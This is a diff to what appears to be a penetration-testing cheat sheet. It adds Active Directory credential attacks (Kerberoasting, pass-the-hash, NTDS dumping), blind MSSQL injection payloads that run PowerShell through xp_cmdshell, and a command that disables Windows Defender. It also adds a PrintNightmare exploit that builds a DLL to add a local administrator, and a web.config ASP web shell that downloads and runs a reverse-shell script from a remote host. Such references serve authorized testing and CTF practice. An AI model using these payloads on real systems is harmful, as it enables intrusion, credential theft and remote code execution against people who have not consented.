@@ -69,9 +69,11 @@ kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'
 
 # Kerberoasting
 GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
+-> 13100 hashcat mode
 
 # bloodhound-python
-bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.locall' -ns 10.10.10.10
+bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.local' -ns 10.10.10.10
+bloodhound-python -u 'nik' --hashes 'aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d' -d 'bank.local' -ns 10.10.10.10
 ```
 
 ### 110,995 (POP3)
@@ -127,6 +129,7 @@ smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
 smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
 smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
 smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'
+smbclient -U 'nik' \\\\10.10.10.10\\Data -c  "get \Windows\test.txt" 'Password@123!' -t 10000
 
 # Smbget
 smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'
@@ -135,6 +138,7 @@ smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'
 crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
 crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
 crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 
+crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 
 # Enum4linux
 enum4linux 10.10.10.10
@@ -262,6 +266,7 @@ nmap -p 3389 --script=rdp-vuln-* 10.10.10.10
 # Commands
 xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
 xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
+rdesktop -a 16 -z -u admin -p password 10.10.10.10
 
 # References
 - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/
@@ -400,6 +405,12 @@ A';waitfor delay '0:0:00';--
 ## Wrong
 ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'IF EXIST "C:\windows2\" (Exit 1) ELSE (Exit 0)',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;--
 
+# Check Hostname
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((hostname)[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
+# Check APPDATA Path
+';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(($env:APPDATA[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
+
 # Check Substring 
 ## Correct
 ';DECLARE @rc INT;EXEC @rc=master..xp_cmdshell 'powershell.exe -c "IF(((Get-ChildItem -Path C:\ -Force -Directory)[0].fullName[0] -eq [char]67)){EXIT 1} ELSE {EXIT 2}"',no_output;IF(@rc=1) WAITFOR DELAY '0:0:10' ELSE WAITFOR DELAY '0:0:0' ;-- 
@@ -435,6 +446,7 @@ A';waitfor delay '0:0:00';--
 
 ## References
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+- https://www.sqlservercentral.com/forums/topic/determining-whether-a-directory-exists-xp_dirtree-xp_subdirs
 
 [SQLITE]
 ## Command
@@ -620,9 +632,9 @@ C:/windows/system32/inetsrv/config/schema/ASPNET_schema.xml
 ../../Views/Shared/Error.cshtml
 ../../Views/Shared/Error.aspx
 ../../Views/Shared/Error.ascx
-../../Viwws/Home/Index.cshtml
-../../Viwws/Home/Index.aspx
-../../Viwws/Home/Index.ascx
+../../Views/Home/Index.cshtml
+../../Views/Home/Index.aspx
+../../Views/Home/Index.ascx
 ../../bin/<namespace found>.dll
 
 # Grep Use in web.config
@@ -1006,6 +1018,13 @@ Invoke-Bloodhound -CollectionMethod All
 Invoke-Bloodhound -CollectionMethod All -ZipFileName test.zip
 ```
 
+### SharpHound.exe
+
+```bash
+# Commands
+/usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
+```
+
 ### jq
 
 ```code
@@ -1103,6 +1122,10 @@ for i in $(cat wordlist.txt);do if [[ $i == /* ]]; then echo $i | sed 's@/@@'; e
 
 # Loop and read from file (line by line)
 while IFS= read -r line; do echo "$line" ; done < word.txt
+
+# xxd
+xxd notes.txt
+echo "62006600610038003100300034007d000d000a00" | xxd -r -p
 ```
 
 ### Linux Alias
@@ -1135,6 +1158,10 @@ wget 10.10.10.10/output.txt -outfile output.txt
 # Find file (recursive)
 Get-ChildItem -Path C:\ -Filter ntds.dit -Recurse -ErrorAction SilentlyContinue -Force
 
+# Search content recursively
+Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "flag" | group path | select name
+Get-ChildItem -Include "*.*" -recurse | Select-String -pattern "password" | group path | select name
+
 # Disable Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 
@@ -1160,6 +1187,10 @@ sc stop serviceanme
 sc start servicename
 sc query servicename
 
+# Find File Recursive
+dir *flag* /s /b
+
+# Search content recursive
 
 ```
 
@@ -1304,6 +1335,7 @@ docker exec -it crackmapexec sh
 ```bash
 # GetNPUsers.py (AsrepRoasting)
 GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat
+=> mode 18200
 
 # GetUserSPNs.py (Kerberoasting)
 GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
@@ -1316,6 +1348,7 @@ secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
 secretsdump.py -ntds ntds.dit -system system local
 secretsdump.py -ntds ntds.dit -system system local -history
 secretsdump.py -sam SAM -system SYSTEM local
+secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
 
 # wmiexec.py
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
@@ -1716,6 +1749,19 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f base64
 
 ```
 
+### TruffleHog
+
+```bash
+[Install truffleHog]
+pip install truffleHog
+
+[Usage]
+trufflehog --regex --entropy=False https://github.com/example/example.git
+
+[References]
+https://github.com/trufflesecurity/truffleHog
+```
+
 ### GhostWriter 
 
 ```bash
@@ -1778,6 +1824,14 @@ https://github.com/GhostManager/Ghostwriter
 	{{ targets.project }}
 {% endfor % }
 
+```
+
+### Sqlmap
+
+```
+# Command
+sqlmap -u "http://example.com/" --data "a=1&b=2&c=3" -p "a,b" --method POST
+sqlmap -u "http://example.com/?a=1&b=2&c=3" -p "a,b"
 ```
 
 ### Nim
@@ -2817,6 +2871,9 @@ set rhosts 10.10.10.10
 # Download
 https://github.com/afwu/PrintNightmare
 
+# Check If vulnerable (If Got Values)
+rpcdump.py @10.10.120.242 | egrep 'MS-RPRN|MS-PAR
+
 # Sysmon (Look into)
 - Event 11 -> spoolsv.exe Writing
 - Event 23 -> Deleting .dll files on C:\Windows\System32\spool\drivers\x64\*
@@ -2833,6 +2890,11 @@ Set-Service -Name Spooler -StartupType Disabled
 
 # Detection References
 https://github.com/LaresLLC/CVE-2021-1675
+
+# Exploit (https://github.com/cube0x0/CVE-2021-1675)
+msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none RC4PASSWORD=S3cr3tP4sw0rdz123 -f dll -o payload.dll
+.\SharpPrintNightmare.exe C:\Users\username\Documents\payload.dll
+-> Make sure read the installation first.
 
 # References
 https://msandbu.org/printnightmare-cve-2021-1675/
@@ -3283,9 +3345,40 @@ https://reposhub.com/python/learning-tutorial/dwisiswant0-awesome-oneliner-bugbo
 
 ```
 
+### web.config (ASP)
+
+```bash
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.10.10/Invoke-PowerShellTcp.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+```
 # References
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://book.hacktricks.xyz/
 - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
 - https://zer1t0.gitlab.io/posts/attacking_ad/
 - https://pentestbook.six2dez.com/
+- https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
